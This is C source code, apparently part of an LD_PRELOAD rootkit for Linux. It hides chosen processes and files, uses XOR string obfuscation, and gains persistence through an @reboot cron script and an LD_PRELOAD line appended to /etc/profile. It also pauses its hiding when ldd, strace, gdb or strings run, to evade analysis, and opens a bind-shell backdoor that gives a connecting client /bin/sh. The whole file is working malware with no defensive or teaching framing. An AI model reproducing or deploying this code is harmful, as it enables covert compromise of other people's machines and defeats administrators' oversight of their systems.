#include "hide.h"

hidden_item_t hidden_processes[MAX_HIDDEN_ITEMS];
hidden_item_t hidden_files[MAX_HIDDEN_ITEMS];
persistence_entry_t persistence_entries[100];
int hidden_process_count = 0;
int hidden_file_count = 0;
int persistence_count = 0;
char rootkit_path[MAX_PATH_LEN] = {0};
char random_hide_path[MAX_PATH_LEN] = {0};
int backdoor_active = 0;
int auto_uninstall_mode = 0;

static char obfuscated_strings[][64] = {
    {0x2b, 0x2e, 0x2c, 0x2b, 0x3a, 0x00},
    {0x2b, 0x2e, 0x2c, 0x2b, 0x3a, 0x2e, 0x2f, 0x00},
    {0x2b, 0x2e, 0x2c, 0x2b, 0x3a, 0x2e, 0x2f, 0x2e, 0x00},
    {0x2b, 0x2e, 0x2c, 0x2b, 0x3a, 0x2e, 0x2f, 0x2e, 0x2f, 0x00}
};

void xor_string(char* str, int len, char key) {
    for (int i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

void deobfuscate_string(char* str, int len) {
    xor_string(str, len, XOR_KEY);
}

int is_hidden_process(const char* name, int pid) {
    if (auto_uninstall_mode) return 0;
    
    for (int i = 0; i < hidden_process_count; i++) {
        if (strstr(name, hidden_processes[i].process_name) != NULL) {
            return 1;
        }
        if (hidden_processes[i].pid == pid) {
            return 1;
        }
    }
    return 0;
}

int is_hidden_file(const char* name) {
    if (auto_uninstall_mode) return 0;
    
    for (int i = 0; i < hidden_file_count; i++) {
        if (strstr(name, hidden_files[i].file_name) != NULL) {
            return 1;
        }
    }
    return 0;
}

void add_hidden_process(const char* name, int pid) {
    if (hidden_process_count < MAX_HIDDEN_ITEMS) {
        strncpy(hidden_processes[hidden_process_count].process_name, name, MAX_PATH_LEN - 1);
        hidden_processes[hidden_process_count].pid = pid;
        hidden_processes[hidden_process_count].hide_time = time(NULL);
        hidden_process_count++;
    }
}

void add_hidden_file(const char* name) {
    if (hidden_file_count < MAX_HIDDEN_ITEMS) {
        strncpy(hidden_files[hidden_file_count].file_name, name, MAX_PATH_LEN - 1);
        hidden_files[hidden_file_count].hide_time = time(NULL);
        hidden_file_count++;
    }
}

void remove_hidden_process(const char* name) {
    for (int i = 0; i < hidden_process_count; i++) {
        if (strcmp(hidden_processes[i].process_name, name) == 0) {
            for (int j = i; j < hidden_process_count - 1; j++) {
                hidden_processes[j] = hidden_processes[j + 1];
            }
            hidden_process_count--;
            break;
        }
    }
}

void remove_hidden_file(const char* name) {
    for (int i = 0; i < hidden_file_count; i++) {
        if (strcmp(hidden_files[i].file_name, name) == 0) {
            for (int j = i; j < hidden_file_count - 1; j++) {
                hidden_files[j] = hidden_files[j + 1];
            }
            hidden_file_count--;
            break;
        }
    }
}

void generate_random_path(char* path) {
    char random_chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    srand(time(NULL) ^ getpid());
    
    strcpy(path, "/tmp/");
    for (int i = 5; i < RANDOM_PATH_LEN - 1; i++) {
        path[i] = random_chars[rand() % (sizeof(random_chars) - 1)];
    }
    path[RANDOM_PATH_LEN - 1] = '\0';
}

void setup_persistence(void) {
    char cron_entry[512];
    char script_path[256];
    
    generate_random_path(script_path);
    strcat(script_path, ".sh");
    
    FILE* script = fopen(script_path, "w");
    if (script) {
        fprintf(script, "#!/bin/bash\n");
        fprintf(script, "LD_PRELOAD=%s exec \"$@\"\n", rootkit_path);
        fclose(script);
        chmod(script_path, 0755);
    }
    
    snprintf(cron_entry, sizeof(cron_entry), 
             "@reboot %s\n", script_path);
    
    FILE* cron_file = fopen("/tmp/cron_entry", "w");
    if (cron_file) {
        fputs(cron_entry, cron_file);
        fclose(cron_file);
    }
}

void check_auto_uninstall(void) {
    static time_t last_check = 0;
    time_t now = time(NULL);
    
    if (now - last_check < 5) return;
    last_check = now;
    
    FILE* proc_self = fopen("/proc/self/cmdline", "r");
    if (proc_self) {
        char cmdline[1024];
        fread(cmdline, 1, sizeof(cmdline) - 1, proc_self);
        fclose(proc_self);
        
        if (strstr(cmdline, "ldd") || strstr(cmdline, "strace") || 
            strstr(cmdline, "gdb") || strstr(cmdline, "strings")) {
            auto_uninstall_mode = 1;
            sleep(2);
            auto_uninstall_mode = 0;
        }
    }
}

void activate_backdoor(void) {
    if (backdoor_active) return;
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BACKDOOR_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return;
    }
    
    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        return;
    }
    
    backdoor_active = 1;
    
    int client_fd = accept(sockfd, NULL, NULL);
    if (client_fd >= 0) {
        char* shell = "/bin/sh";
        char* args[] = {shell, NULL};
        char* env[] = {NULL};
        
        dup2(client_fd, 0);
        dup2(client_fd, 1);
        dup2(client_fd, 2);
        
        execve(shell, args, env);
        close(client_fd);
    }
    
    close(sockfd);
    backdoor_active = 0;
}

void hide_from_ldd(void) {
    char* ldd_paths[] = {
        "/usr/bin/ldd",
        "/bin/ldd",
        "/usr/local/bin/ldd"
    };
    
    for (int i = 0; i < 3; i++) {
        if (access(ldd_paths[i], F_OK) == 0) {
            add_hidden_file(ldd_paths[i]);
        }
    }
}

void create_alternative_loading(void) {
    char env_script[512];
    char profile_entry[256];
    
    generate_random_path(env_script);
    strcat(env_script, "_env");
    
    FILE* script = fopen(env_script, "w");
    if (script) {
        fprintf(script, "export LD_PRELOAD=%s\n", rootkit_path);
        fclose(script);
    }
    
    snprintf(profile_entry, sizeof(profile_entry), 
             "source %s\n", env_script);
    
    FILE* profile = fopen("/etc/profile", "a");
    if (profile) {
        fputs(profile_entry, profile);
        fclose(profile);
    }
}
